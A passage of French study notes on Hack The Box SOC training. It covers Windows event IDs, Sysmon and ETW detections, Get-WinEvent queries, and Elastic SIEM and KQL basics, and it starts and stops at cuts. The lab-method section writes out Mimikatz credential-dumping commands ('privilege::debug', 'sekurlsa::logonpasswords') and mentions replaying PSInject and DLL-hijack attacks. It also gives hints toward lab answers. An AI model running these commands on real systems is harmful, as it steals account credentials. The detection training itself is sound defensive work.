        - segmentation réseau, 802.1X, Conditional Access,
        - baselines AD / endpoints,
        - DMARC pour réduire le phishing,
        - user awareness & purple teaming.
    
    ### Pratique outils
    
    - Utilisation de **TheHive** pour :
        - grouper des alertes en **cas**,
        - enrichir les alertes (notes, observables, MITRE IDs),
        - suivre l’avancement de l’enquête.
    - Lecture de logs **Wazuh / Windows / Sysmon** pour :
        - détecter le **credential dumping**,
        - repérer des **persistances services** (`PSEXESVC.exe`),
        - reconnaître les patterns de **RDP public** (Event 4624 type 10, IP externe),
        - identifier les **flux d’exfiltration**.
    - Méthodo pour **décoder un PowerShell obfusqué** et en sortir les **IOCs**.

## **Windows Event Logs & Finding Evil**

![image42.png](image42.png)

## Contexte & objectifs

Ce mini-module Hack The Box montre comment exploiter les journaux Windows pour **détecter, comprendre et chasser des activités malveillantes** sur un poste Windows :

- Journaux classiques Windows (Application / System / Security / …)
- Sysmon et ses évènements riches (création de process, connexions réseau, chargement de DLL, accès à des process sensibles, …)
- **ETW (Event Tracing for Windows)** comme source de télémétrie avancée
- **Get-WinEvent** pour analyser des tonnes de logs (fichiers .evtx, Sysmon, ETW) en PowerShell

Le module alterne théorie, détection d’attaques (DLL hijack, injection .NET/PowerShell, credential dumping) et exercices pratiques sur une VM Windows.

## Windows Event Logs : bases & anatomie

### Types de journaux

Windows enregistre énormément d’infos dans différents logs :

- **Application** : erreurs et infos des programmes
- **System** : évènements du système / pilotes / services
- **Security** : authentification, accès à des ressources, audit
- **Setup** : installation / configuration
- **Forwarded Events** : logs centralisés provenant d’autres machines

Ces logs sont consultables :

- avec **Event Viewer (eventvwr.msc)**
- ou via des APIs / cmdlets (Windows Event Log API, Get-WinEvent, etc.)

On peut aussi ouvrir des **.evtx sauvegardés** (“Saved Logs”).

### Anatomie d’un évènement

Chaque entrée dans un journal est un **Event** avec notamment :

- **Log Name** : Application, System, Security, …
- **Source** : composant qui a généré l’évènement
- **Event ID** : identifiant unique du type d’évènement
- **Task Category** : sous-catégorie / contexte
- **Level** : Information, Warning, Error, Critical, Verbose
- **Keywords** : flags (ex. Audit Success / Audit Failure en Security)
- **User** : compte utilisateur responsable
- **OpCode** : type d’opération (start, stop, etc.)
- **Logged** : date / heure
- **Computer** : nom de la machine
- **XML** : version complète en XML avec toutes les données

Ce format XML est crucial pour :

- faire des **filtres avancés** dans l’Event Viewer (XML Query)
- et pour automatiser avec PowerShell (ToXml(), parsing, etc.)

### Exemple clé : Event ID 4624 – Successful Logon

L’event **4624** dans le journal *Security* correspond à un **logon réussi** :

- contient notamment **Logon ID** (identifiant de session)
- **Logon Type** (interactif, service, RDP, batch, etc.)

On peut :

- utiliser le **Logon ID** pour **corréler** plusieurs évènements (logon, privilèges élevés, actions sur fichiers, etc.)
- surveiller les **types de logon** anormaux (par ex. service / batch pour un compte utilisateur classique)

Autre évènement important associé : **4672 – Special privileges assigned to new logon**, qui indique un logon avec des privilèges élevés (SeDebugPrivilege, etc.).

### SACL & Event ID 4907 – Audit policy change

L’Event **4907** signale un changement de **SACL** (System Access Control List) sur un objet (fichier, clé de registre…).

Une SACL sert à définir **quelles actions seront journalisées** (succès, échec).

Dans cet event, on trouve :

- l’objet ciblé (ObjectName)
- le process responsable (**ProcessName**, ex. *SetupHost.exe*)
- et les descripteurs de sécurité avant/après (OldSd / NewSd)

C’est typiquement le genre d’évènement à corréler avec un logon (4624) pour comprendre **qui** a modifié **quoi**.

### IDs utiles à surveiller

Quelques IDs particulièrement intéressants :

**System**

- 1074 : arrêt/redémarrage du système (qui / pourquoi)
- 6005 / 6006 : démarrage / arrêt du service de log (boot/shutdown)
- 6013 : uptime (peut révéler des redémarrages suspects)
- 7040 : changement de type de démarrage d’un service

**Security**

- 1102 : audit log effacé (tentative de couvrir ses traces)
- 1116 / 1118 / 1119 / 1120 : détection/remédiation AV Defender
- 4624 : logon réussi
- 4625 : logon échoué (brute-force, essais suspects)
- 4648 : logon avec credentials explicites (lateral movement)
- 4656 : handle sur un objet (accès à un fichier/clé/process sensible)
- 4672 : logon avec privilèges spéciaux
- 4698 / 4700-4702 : création / modification / activation de tâches planifiées (persistence)
- 4719 : changement de la politique d’audit
- 4738 : compte utilisateur modifié
- 4771 / 4776 : échecs Kerberos / validation de credentials
- 5001 : changement de config de la protection temps réel AV
- 5140 / 5142 / 5145 : accès / création / vérification d’un partage réseau
- 5157 : connexion bloquée par le Windows Filtering Platform
- 7045 : service installé (souvent utilisé par des malwares)

🔑 **Idée clé** : savoir **ce qui est “normal”** dans ton environnement, et alerter sur les anomalies (heures inhabituelles, nouveaux services, tâches planifiées suspectes, logons admin non prévus…).

## Sysmon & Event Logs : trouver l’evil

### Rappel Sysmon

**Sysmon (System Monitor)** :

- service + driver Windows
- logue dans **Microsoft-Windows-Sysmon/Operational**
- fournit des évènements bien plus détaillés que les journaux classiques :
    - **ID 1** : Process Create
    - **ID 3** : Network Connection
    - **ID 7** : Image Loaded (chargement de DLL)
    - **ID 10** : ProcessAccess (accès à un autre process, ex. LSASS)
    - etc.

Le comportement de Sysmon est totalement piloté par un **fichier de configuration XML**.

Le module utilise la config de **SwiftOnSecurity** (GitHub), qui est une base très complète.

### Détection 1 : DLL hijacking (calc.exe / WININET.dll)

But : détecter un **DLL hijack**, ici sur **calc.exe** avec une DLL Windows légitime copiée et remplacée.

1. Config Sysmon :
    - règle **ImageLoad** passée en mode `exclude` sans règles → **tout est logué** (aucune exclusion).
2. On place un `calc.exe` et une fausse **WININET.dll** (hijacked) dans un répertoire **écrivable** (ex. Desktop).
3. On lance `calc.exe` : au lieu de la calculatrice, c’est la DLL malveillante qui affiche un message.

Dans les logs Sysmon (Event ID 7) on observe :

- **Image** : `calc.exe` lancé depuis un dossier utilisateur (pas System32)
- **ImageLoaded** : `WININET.dll` chargée depuis ce même dossier
- `Signed: false` alors que la vraie DLL système est signée Microsoft

**IOCs principaux :**

1. **calc.exe** en dehors de `C:\Windows\System32` / `SysWOW64`
2. `WININET.dll` chargée en dehors de `System32` par calc.exe
3. DLL non signée alors que normalement **signée Microsoft**

### Détection 2 : Unmanaged PowerShell / C# injection

Idée : certains outils injectent un **runtime .NET** (clr.dll, clrjit.dll) dans des process qui ne sont pas censés exécuter du .NET.

Outils :

- **Process Hacker** pour voir :
    - quels process sont “managed (.NET)” (clr.dll / clrjit.dll chargés)
    - la liste des modules chargés par chaque process
- **Sysmon Event ID 7** pour les chargements de DLL

Scénario :

1. On injecte une DLL de “PowerShell unmanaged” dans un process comme **spoolsv.exe** avec **PSInject**.
2. Avant injection : spoolsv.exe = process natif, pas de clr.dll.
3. Après injection :
    - spoolsv.exe apparaît comme **Process managed (.NET)**
    - Sysmon ID 7 montre le chargement de `clr.dll` / `clrjit.dll` dans spoolsv.exe

**IOC** : chargement de DLLs .NET (clr, clrjit) dans des process qui n’utilisent **normalement pas** .NET.

### Détection 3 : Credential dumping (Mimikatz / LSASS)

Attaque : **Mimikatz** avec `sekurlsa::logonpasswords` pour lire les credentials en mémoire dans **LSASS**.

Détection avec Sysmon :

- **Event ID 10 – ProcessAccess**
    - `TargetImage` = `lsass.exe`
    - `SourceImage` = binaire suspect (mimikatz.exe ou loader custom)
    - `SourceUser` ≠ `TargetUser` (ex : waldo → SYSTEM)
    - en amont : demande de **SeDebugPrivilege**

**Idée** : surveiller toute tentative d’accès à LSASS en dehors des outils légitimes (AV/EDR, composants système).

## Event Tracing for Windows (ETW)

### Définition & architecture

**ETW** = infrastructure de traçage haute performance intégrée à Windows.

Architecture en modèle *pub/sub* :

- **Providers** : composants qui émettent des évènements
- **Sessions** : collectent les évènements de certains providers
- **Controllers** : créent / démarrent / stoppent les sessions (ex. `logman.exe`)
- **Consumers** : lisent les events (Event Log, outils, scripts…)
- **ETL files** : logs binaires persistants sur disque
- **Channels** : organisent les events (administrative, operational, analytical…)

Types de providers :

- **MOF**, **WPP**, **Manifest-based**, **TraceLogging**

### logman & autres outils

- `logman query -ets` : liste les **sessions ETW actives** (dont Sysmon)
- `logman query "EventLog-System" -ets` : détails d’une session
    - providers, keywords, niveau (Error, Info…), log file, etc.
- `logman query providers` : liste tous les providers disponibles (il y en a **>1000** sous Windows 10)

Autres outils GUI :

- **Performance Monitor** → “Event Trace Sessions”
- **EtwExplorer** (projet externe) pour explorer la métadonnée des providers (keywords, events, etc.)

### Providers utiles & providers restreints

Exemples intéressants :

- `Microsoft-Windows-Kernel-Process` / `File` / `Network` / `Registry`
- `Microsoft-Windows-SMBClient/SMBServer`
- `Microsoft-Windows-DotNETRuntime`
- `Microsoft-Windows-PowerShell`
- `Microsoft-Windows-TerminalServices-LocalSessionManager`
- `Microsoft-Windows-DNS-Client`
- providers AV / antimalware

**Providers restreints** :

- ex. `Microsoft-Windows-Threat-Intelligence`
    
    → accessible seulement à des processus protégés par **PPL (Protected Process Light)** (typiquement les AV approuvés par Microsoft).
    

## Tapping Into ETW : détections avancées

### Détection 1 : parent-child relationships anormales

But : repérer des **relations parent/enfant impossibles** (ex. spoolsv.exe → cmd.exe).

Problème :

- Des techniques (ex. **Parent PID Spoofing**) permettent de tromper Sysmon (ID 1) sur le parent affiché.

Solution :

- Utiliser ETW avec le provider **Microsoft-Windows-Kernel-Process**, capturé via **SilkETW**.

Exemple :

1. On spoofe le parent de `cmd.exe` pour qu’il semble lancé par `spoolsv.exe`.
2. Sysmon ID 1 affiche spoolsv.exe comme parent.
3. En parallèle, on lance SilkETW :
    
    ```bash
    SilkETW.exe -t user -pn Microsoft-Windows-Kernel-Process -ot file -p C:\Windows\Temp\etw.json
    
    ```
    
4. En analysant `etw.json`, on trouve que le vrai parent est `powershell.exe`.

Conclusion : **Sysmon peut être trompé**, ETW “kernel process” donne une vérité plus proche de la réalité → intérêt pour la chasse avancée.

### Détection 2 : chargement de .NET assemblies malveillantes (BYOL)

Concept **Bring Your Own Land (BYOL)** :

- au lieu de “Living off the Land” (LOLBins), l’attaquant apporte ses propres outils .NET compilés (assemblies), exécutés directement en mémoire (ex. `Seatbelt.exe`).

Détection en 2 niveaux :

1. **Sysmon Event ID 7** :
    - `Image` = `Seatbelt.exe`
    - `ImageLoaded` = `clr.dll`, `mscoree.dll`
    - → confirme un binaire .NET
2. **ETW – Microsoft-Windows-DotNETRuntime** via SilkETW :
    
    ```bash
    SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\Windows\Temp\etw.json
    
    ```
    
    - `uk 0x2038` = sélectionne certains **keywords** (JIT, Loader, Interop, NGen)
    - `etw.json` contient des détails sur :
        - les méthodes JIT-compilées
        - les assemblies chargées
        - les méthodes d’interop (ManagedInteropMethodName, etc.)

→ On obtient une **vue très fine** de ce que fait l’assembly .NET (ex. des méthodes de Seatbelt).

## Get-WinEvent : analyse massive de logs

### Pourquoi Get-WinEvent ?

Les environnements réels produisent **des millions de logs / jour**.

On ne peut pas tout lire à la main dans Event Viewer.

**Get-WinEvent** permet :

- d’énumérer les logs disponibles
- de lire à la fois :
    - logs classiques (System, Security, Application…)
    - ETW logs (ex. `Microsoft-Windows-WinRM/Operational`)
    - fichiers **.evtx** ou **.etl** exportés
- d’appliquer des **filtres puissants** :
    - FilterHashtable
    - FilterXml
    - FilterXPath
- de parser l’XML, enrichir, corréler, etc.

### Lister logs & providers

- Lister tous les logs :
    
    ```powershell
    Get-WinEvent -ListLog * |
      Select-Object LogName, RecordCount, IsClassicLog, IsEnabled, LogMode, LogType |
      Format-Table -AutoSize
    
    ```
    
- Lister les providers et les logs associés :
    
    ```powershell
    Get-WinEvent -ListProvider * | Format-Table -AutoSize
    
    ```
    

### Lire des logs

- Derniers events du log System :
    
    ```powershell
    Get-WinEvent -LogName 'System' -MaxEvents 50 |
      Select-Object TimeCreated, Id, ProviderName, LevelDisplayName, Message |
      Format-Table -AutoSize
    
    ```
    
- Plus anciens events d’un log :
    
    ```powershell
    Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -Oldest -MaxEvents 30 |
      Select-Object TimeCreated, Id, ProviderName, LevelDisplayName, Message |
      Format-Table -AutoSize
    
    ```
    
- Lire un fichier `.evtx` :
    
    ```powershell
    Get-WinEvent -Path 'C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Execution\exec_sysmon_1_lolbin_pcalua.evtx' -MaxEvents 5 |
      Select-Object TimeCreated, Id, ProviderName, LevelDisplayName, Message |
      Format-Table -AutoSize
    
    ```
    

### FilterHashtable

Filtrer par log, ID, dates, etc. :

```powershell
# Sysmon ID 1 & 3
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-Sysmon/Operational'
  Id      = 1,3
} | Select TimeCreated, Id, ProviderName, Message

```

Avec plage de dates :

```powershell
$startDate = (Get-Date -Year 2023 -Month 5 -Day 28).Date
$endDate   = (Get-Date -Year 2023 -Month 6 -Day 3).Date

Get-WinEvent -FilterHashtable @{
  LogName   = 'Microsoft-Windows-Sysmon/Operational'
  Id        = 1,3
  StartTime = $startDate
  EndTime   = $endDate
} | Select TimeCreated, Id, ProviderName, Message

```

Filtrer un fichier `evtx` avec FilterHashtable :

```powershell
Get-WinEvent -FilterHashtable @{
  Path = 'C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Execution\sysmon_mshta_sharpshooter_stageless_meterpreter.evtx'
  Id   = 1,3
}

```

### FilterXml

Utiliser une requête XML (comme dans Event Viewer) :

```powershell
$Query = @"
<QueryList>
  <Query Id="0">
    <Select Path="Microsoft-Windows-Sysmon/Operational">
      *[System[(EventID=7)]] and
      (*[EventData[Data='mscoree.dll']] or *[EventData[Data='clr.dll']])
    </Select>
  </Query>
</QueryList>
"@

Get-WinEvent -FilterXml $Query | ForEach-Object {
  Write-Host $_.Message "`n"
}

```

→ Permet par exemple de repérer les chargements de `mscoree.dll` / `clr.dll` (assemblies .NET).

### FilterXPath

Exemple : détecter installation d’outils Sysinternals (EULA acceptée via `reg.exe`) :

```powershell
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' `
  -FilterXPath "*[EventData[Data[@Name='Image']='C:\Windows\System32\reg.exe']] and
                *[EventData[Data[@Name='CommandLine']=
                  '`"C:\Windows\system32\reg.exe`" ADD HKCU\Software\Sysinternals /v EulaAccepted /t REG_DWORD /d 1 /f']]" |
  Select TimeCreated, Id, ProviderName, LevelDisplayName, Message

```

Exemple réseau : Sysmon ID 3 vers IP suspecte :

```powershell
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' `
  -FilterXPath "*[System[EventID=3] and
                 EventData[Data[@Name='DestinationIp']='52.113.194.132']]"

```

### Manipuler toutes les propriétés

Obtenir toutes les propriétés d’un évènement :

```powershell
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-Sysmon/Operational'
  Id      = 1
} -MaxEvents 1 | Select-Object -Property *

```

Filtrer sur un champ spécifique (ex. parent command line contenant `-enc`) :

```powershell
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-Sysmon/Operational'
  Id      = 1
} |
Where-Object { $_.Properties[21].Value -like "*-enc*" } |
Format-List

```

→ `Properties[21]` correspond ici à `ParentCommandLine` pour Sysmon ID 1.

## Exercices pratiques : stratégie générale (sans les réponses)

Le module propose plusieurs labs RDP sur une VM Windows. Méthodo générale :

### Windows Event Logs (Security / XML Query)

1. Se connecter en RDP (`xfreerdp` avec les creds fournis).
2. Ouvrir **Event Viewer** → Windows Logs → Security.
3. Filtrer par **Event ID 4624** et par date/heure demandée.
4. Récupérer le **Logon ID** dans le détail.
5. Construire une **XML query** qui filtre les évènements de type 4907 / autres avec ce Logon ID
    
    (filter SubjectLogonId + éventuellement ObjectName pour un chemin précis).
    
6. Dans l’event trouvé, noter :
    - ProcessName (exécutable responsable de la modification d’audit)
    - Heure de l’évènement au format demandé (HH:MM:SS).

### Sysmon – DLL hijack / Unmanaged PS / Credential Dumping

Sur la VM :

- Configurer Sysmon avec la config fournie (`sysmon.exe -i ...`, puis `sysmon.exe -c config.xml`).
- Rejouer les attaques décrites (DLL hijack, PSInject, Mimikatz).

Exemples d’actions utiles :

- DLL hijack :
    - Trouver `WININET.dll` malveillante → `Get-FileHash -Algorithm SHA256`
- Unmanaged PowerShell :
    - Après injection dans spoolsv.exe, repérer dans Sysmon ID 7 le chemin de `clrjit.dll`
    - Hasher le fichier : `Get-FileHash "C:\Windows\...\clrjit.dll" -Algorithm SHA256`
- Credential dumping :
    - Lancer mimikatz, `privilege::debug` puis `sekurlsa::logonpasswords`
    - Récupérer le hash **NTLM** du compte Administrator demandé.

### ETW + Seatbelt + SilkETW

1. Lancer SilkETW sur `Microsoft-Windows-DotNETRuntime` avec les bons keywords.
2. Exécuter `Seatbelt.exe TokenPrivileges`.
3. Ouvrir `etw.json` et chercher `ManagedInteropMethodName`.
4. Repérer la valeur qui commence par **G** et finit par **ion**, la donner comme réponse.

### Get-WinEvent + fichiers EVTX (Lateral Movement)

1. Utiliser PowerShell pour lire tous les `.evtx` d’un dossier :
    
    ```powershell
    Get-ChildItem "C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Lateral Movement" -Filter *.evtx |
    ForEach-Object {
      Get-WinEvent -Path $_.FullName
    }
    
    ```
    
2. Ajouter un filtre pour les events liés aux partages (`5142` ou similaire selon les fichiers), et chercher `\\*\PRINT` dans le message.
3. Récupérer l’heure de l’event (`TimeCreated`) → format HH:MM:SS.

![image34.png](image34.png)

## **Security Monitoring & SIEM Fundamentals**

## Contexte & objectifs du module

Ce module pose les bases du travail en **SOC** autour de trois axes principaux :

- Comprendre ce qu’est un **SIEM** et son rôle dans la détection d’incidents.
- Savoir utiliser l’**Elastic Stack** (Elasticsearch, Logstash, Kibana, Beats) comme SIEM.
- Construire des **use cases de détection**, des **visualisations Kibana** et maîtriser le **triage des alertes**.

C’est un module très “opérationnel SOC” : beaucoup de théorie (SIEM, SOC, MITRE ATT&CK) mais aussi de la pratique (KQL, dashboards, tableaux de failed logon, etc.).

## SIEM – Définition, fonctionnement, bénéfices

![visualization16.png](visualization16.png)

### Qu’est-ce qu’un SIEM ?

**SIEM** = *Security Information and Event Management*.
C’est une solution qui :

- **Collecte** des logs et événements de sécurité (firewalls, serveurs, OS, applications…).
- **Normalise et corrèle** ces événements dans un format commun.
- **Déclenche des alertes** selon des règles (use cases).
- Permet **visualisation, reporting, incident handling**.

Le SIEM est au centre du SOC : c’est l’outil qui donne une **vision centralisée** de la posture de sécurité.

### Évolution SIM / SEM → SIEM

À l’origine, on avait deux briques séparées :

- **SIM (Security Information Management)**
    - Stockage long terme des logs
    - Reporting, analyse historique, corrélation avec de la threat intel
- **SEM (Security Event Management)**
    - Temps réel, corrélation d’événements
    - Alertes, notifications, console temps réel

Le **SIEM** moderne fusionne ces deux approches : stockage + temps réel, avec corrélation avancée, dashboards, incident handling, etc.

### Comment fonctionne un SIEM ?

1. **Ingestion des données** :
    - PC, serveurs, équipements réseau, appliances sécurité, etc.
    - Protocoles : syslog, agents, API, collectors, etc.
2. **Normalisation & agrégation** :
    - Conversion des logs bruts vers un format commun (champs standardisés).
    - Agrégation pour éviter les doublons ou réduire le bruit.
3. **Corrélation & règles** :
    - Détection de patterns (ex : 10 échecs de login en 4 minutes).
    - Mise en place de **use cases** avec seuils, agrégations, priorités.
4. **Alerting** :
    - Envoi aux équipes SOC via : console, email, SMS, etc.
    - Objectif : signaler les événements à **fort risque**, pas tout le bruit.
5. **Reporting & compliance** :
    - Génération de rapports pour **PCI DSS, HIPAA, GDPR, ISO**, etc.
    - Preuve que les systèmes sont **journalisés, monitorés et revus**.

### Pourquoi un SIEM est indispensable ?

Sans SIEM :

- Logs dispersés, non corrélés → forte chance de **rater un incident grave**.
- Aucun “tableau de bord” global → vue fragmentée de la sécurité.
- Beaucoup d’investigations manuelles, lourdes.

Avec un SIEM bien tuné :

- Capacité à voir des patterns (ex : un firewall + proxy + AD qui parlent tous du même host).
- Détection de comportements suspects :
    - Ex : 5 tentatives ratées sur un firewall qui lockent un compte admin.
    - Ex : un poste qui se connecte 100 fois par heure à un domaine malveillant.
- Réduction du coût d’un incident (détection plus rapide → impact limité).
- Respect des **obligations réglementaires** (banque, santé, finance…).

## Elastic Stack comme SIEM

![elastic.png](elastic.png)

### Composants de l’Elastic Stack

- **Elasticsearch**
    - Moteur de recherche distribué, REST, JSON.
    - Indexation, stockage, requêtes, agrégations.
- **Logstash**
    - Pipeline de traitement de logs.
    - **Input → Filter → Output**
    - Collecte (fichiers, TCP, syslog…), transformation (parse, enrichissement), envoi vers Elasticsearch.
- **Kibana**
    - Interface de visualisation : dashboards, graphiques, tableaux.
    - Requêtes, exploration de données, outils de détection.
- **Beats** (Filebeat, Metricbeat, Winlogbeat, etc.)
    - “Mini-agents” mono-fonction : collectent logs/metrics sur les machines.
    - Envoient vers Logstash ou Elasticsearch.

Architecture typique SIEM avec Elastic :

- **Beats → Logstash → Elasticsearch → Kibana**
(avec parfois Kafka/Redis/nginx pour la résilience et la sécurité).

### KQL (Kibana Query Language)

**KQL** est le langage de requête de Kibana : plus simple que le Query DSL d’Elasticsearch.

### Exemples de base

- Filtrer un event Windows d’échec de logon :

```
event.code:4625

```

- Ajouter une condition sur la SubStatus (compte désactivé) :

```
event.code:4625 AND winlog.event_data.SubStatus:0xC0000072

```

- Filtrer par plage temporelle :

```
event.code:4625 AND winlog.event_data.SubStatus:0xC0000072
AND @timestamp >= "2023-03-03T00:00:00.000Z"
AND @timestamp <= "2023-03-06T23:59:59.999Z"

```

- Recherche texte libre :

```
"svc-sql1"

```

- Wildcards :

```
event.code:4625 AND user.name: admin*

```

### Découvrir les champs disponibles

Méthode proposée :

1. Dans **Discover**, faire une recherche (ex : `4625`).
2. Regarder les champs présents dans les documents :
    - `event.code`, `winlog.event_id`, `winlog.event_data.SubStatus`, etc.
3. Utiliser aussi la recherche de champs dans Kibana (barre de recherche des field names).
4. Compléter avec la documentation :
    - ECS (Elastic Common Schema)
    - Winlogbeat fields, Filebeat fields, etc.

### Elastic Common Schema (ECS)

ECS = vocabulaire partagé pour tous les événements/logs dans Elastic.

Avantages :

- **Noms de champs cohérents** entre sources (Windows, réseau, endpoints, cloud).
- Requêtes KQL réutilisables partout (moins de “si c’est Winlogbeat alors champ X…”).
- Corrélation facilitée (search sur `source.ip`, `destination.ip`, `event.action`, etc.).
- Dashboards plus simples à construire et réutiliser.
- Compatibilité avec les features avancées : Elastic Security, ML, Observability.

## SOC – Définitions, rôles & maturité

![usecase1.png](usecase1.png)

### Qu’est-ce qu’un SOC ?

Un **Security Operations Center** est une équipe (et souvent un lieu) dédiée à :

- **Surveiller en continu** la sécurité de l’organisation.
- **Détecter, analyser, répondre** aux incidents.
- Utiliser des outils type **SIEM, IDS/IPS, EDR**, threat intel, etc.
- Travailler avec les équipes **Incident Response** pour contenir/remédier.

Le SOC se concentre sur **l’opérationnel** (run), pas sur la conception d’architecture ou l’implémentation initiale des solutions.

### Rôles principaux dans un SOC

- **SOC Director** : stratégie, budget, vision, alignement business.
- **SOC Manager** : opérations quotidiennes, planning, coordination des incidents.
- **Tier 1 Analyst** :
    - “First responder”
    - Surveille le SIEM, qualifie les alertes, fait le triage, escalade si nécessaire.
- **Tier 2 Analyst** :
    - Analyse plus profonde, pattern detection, tuning des règles pour réduire les faux positifs.
- **Tier 3 Analyst** :
    - Cas les plus complexes, threat hunting, techniques avancées.
- **Detection Engineer** :
    - Écrit et maintient les règles de détection SIEM / IDS / EDR.
    - Comble les trous de couverture.
- **Incident Responder** :
    - Gère les incidents majeurs, forensics, containment, éradication.
- **Threat Intelligence Analyst** :
    - Collecte, analyse et diffuse les indicateurs & TTP adverses.
- **Security Engineer** :
    - Maintient l’infra sécurité (EDR, SIEM, firewalls…).
- **Compliance & Governance** :
    - S’assure que le SOC et les process respectent les normes (ISO, PCI, etc.).
- **Security Awareness & Training** :
    - Forme les utilisateurs, sensibilisation sécurité.

### SOC Stages (maturité)

- **SOC 1.0**
    - Focalisé réseau/périmètre, outils peu intégrés, alertes isolées.
    - Encore très réactif et limité face aux attaques multi-vecteurs modernes.
- **SOC 2.0** – **approche proactive**
    - Intègre **télémétrie**, threat intel, analyse de flux réseau, anomalies.
    - Utilise Layer 7, corrélation avancée, partage d’info entre SOCs.
    - Préparation pré-incident : vuln management, config management, risk management dynamique.
    - Post-incident : IR, forensics, amélioration continue.
- **Cognitive SOC (next-gen)**
    - Ajout de **systèmes de machine learning / AI** pour combler les gaps d’expérience.
    - Collaboration renforcée entre métier et sécurité, procédures IR plus matures.

## MITRE ATT&CK & opérations de sécurité

### MITRE ATT&CK, c’est quoi ?

- Un framework qui recense les **tactiques, techniques et procédures (TTP)** des attaquants.
- Organisé en **matrices** selon le contexte : Enterprise, Mobile, Cloud…
- Chaque **tactic** = objectif (p. ex. Execution, Persistence, Exfiltration).
Chaque **technique** = méthode concrète.

### Use cases MITRE en SOC

- **Détection & réponse** :
    - Mapper les règles et alertes aux TTP MITRE pour couvrir un max d’étapes du kill chain.
- **Évaluation et gap analysis** :
    - Vérifier quelles techniques on sait détecter, lesquelles sont encore un “blind spot”.
- **Maturité SOC** :
    - Mesurer la capacité du SOC à détecter/répondre aux TTP sur la matrice.
- **Threat Intelligence & enrichment** :
    - Langage commun pour décrire les comportements adverses.
    - Enrichir les IOC avec des infos TTP.
- **Behavioral analytics** :
    - Mapper les TTP à des comportements d’utilisateurs/systèmes.
- **Red Team / Pentest** :
    - Utiliser MITRE ATT&CK comme “catalogue” de techniques à simuler.
- **Formation** :
    - Excellent support pédagogique pour apprendre les techniques d’attaquants.

## Développement de SIEM Use Cases

### Qu’est-ce qu’un SIEM use case ?

Un **use case** = scénario précis que le SIEM doit détecter.

Exemples :

- Simple :
    - Brute force → 10 échecs de login pour un utilisateur en 4 minutes.
- Complexe :
    - Ransomware (combinaison de multiples signaux : volumes de fichiers modifiés, process suspects, connexions réseau inhabituelles…).

### Cycle de vie d’un use case

1. **Requirements**
    - Qu’est-ce qu’on veut détecter ?
    - Qui propose : client, analyste, management…
    - Exemple : “Brute force AD : alerte après 10 login failed en 4 minutes”.
2. **Data Points**
    - Où se produisent les authentifications ? Windows, Linux, VPN, OWA, apps, etc.
    - Quelles sources de logs couvrent ces points ?
3. **Log Validation**
    - Vérifier que les logs contiennent : user, timestamp, source, dest, machine, app…
    - Vérifier que tous les chemins d’authentification remontent bien dans le SIEM.
4. **Design & Implementation**
    - Définir le **conditionnel**, l’**agrégation** (par IP, par user…), la **priorité**.
    - Éviter les faux positifs (ex : service accounts, scanners internes, etc.).
5. **Documentation (SOP)**
    - Que doit faire l’analyste quand l’alerte tombe ?
    - Escalation matrix, contacts, étapes d’investigation.
6. **Onboarding**
    - D’abord en dev/test, puis en prod.
    - Collecte de feedback, ajustement.
    1. **Fine-tuning**
        - Ajustement de la sévérité.
    
    ### Exemples basés sur MSBuild
    
    ### Exemple 1 – MSBuild lancé par une application Office
    
    - Risque : **LoLBins** (Living off the Land Binaries).
    - Use case : détecter **MSBuild** lancé par Word/Excel, ce qui peut indiquer exécution de code malveillant.
    - MITRE mapping :
        - Tactic **Defense Evasion (TA0005)**
        - Technique **Trusted Developer Utilities Proxy Execution (T1127)**
        - Sub-technique **T1127.001 – MSBuild**
        - Tactic **Execution (TA0002)** aussi.
    
    Sévérité : **HIGH**, car c’est rare et très suspect.
    
    ### Exemple 2 – MSBuild qui initie des connexions réseau
    
    - Focus ici : MSBuild qui fait un **outbound network connection**.
    - Problème : peut aussi pointer vers des IP légitimes (updates Microsoft).
    - Donc plus de risque de faux positifs → **sévérité MEDIUM**.
    - Investigation : se concentrer sur `event.action`, IP cible, réputation IP, contexte utilisateur, etc.
    
    ## Visualisations SIEM dans Kibana (pratique)
    
    ### Failed logon attempts – All users
    
    Objectif : visualiser les **échecs de logon (4625)** pour tous les utilisateurs.
    
    **Étapes principales :**
    
    1. Aller sur `Dashboard` → créer un nouveau dashboard.
    2. Créer une **visualisation** → type **Table**.
    3. Time picker → **Last 15 years** (pour couvrir toutes les données).
    4. Index pattern : `windows*`.
    5. Ajouter un **filtre** :
        
        ```
        event.code: 4625
        
        ```
        
    6. Dans la Table :
        - Rows : `user.name.keyword` → alias **Username**.
        - Rows : `host.hostname.keyword` → alias **Event logged by**.
        - Rows : `winlog.logon.type.keyword` → alias **Logon Type**.
        - Metrics : `Count` → alias **# of logins**.
        - Trier les résultats par **# of logins** décroissant.
    7. Exclure :
        - Certains “usernames” qui sont en fait des noms de machines (ex : `DESKTOP-…`).
        - Toutes les **computer accounts** (AD) qui finissent par `$` :
        
        ```
        NOT user.name: *$
        AND winlog.channel.keyword: Security
        
        ```
        
    8. Donner un **titre** à la visualisation (ex : *Failed logon attempts [All users]*), puis sauver le dashboard.
    
    > Question pratique associée : chercher dans cette table le nombre de logins (count) pour le compte sql-svc1.
    > 
    
    ### Failed logon attempts – Disabled users
    
    Objectif : visualiser les échecs de logon **spécifiquement sur des comptes désactivés**.
    
    **Filtrage :**
    
    - `event.code: 4625` (failed logon)
    - `winlog.event_data.SubStatus: 0xC0000072` (account disabled)
    
    Visualisation type Table :
    
    - Rows :
        - `user.name.keyword` → disabled user
        - `host.hostname.keyword` → machine de logon
        - `winlog.logon.type.keyword` → Logon Type
    - Metrics :
        - `Count` → nombre de tentatives
    
    > Question associée : trouver le Logon Type présent dans le document retourné.
    > 
    
    Deuxième question : failed logon sur **admin users only** (user contient “admin”).
    
    KQL :
    
    ```
    user.name: *admin*
    
    ```
    
    *(pattern “contient admin n’importe où dans le nom”)*
    
    ### Successful RDP logon – Service accounts
    
    Objectif : détecter les **logons RDP réussis** utilisant des **comptes de service**, ce qui ne devrait jamais arriver en prod.
    
    Justice côté logs :
    
    - Windows event `4624` → logon réussi.
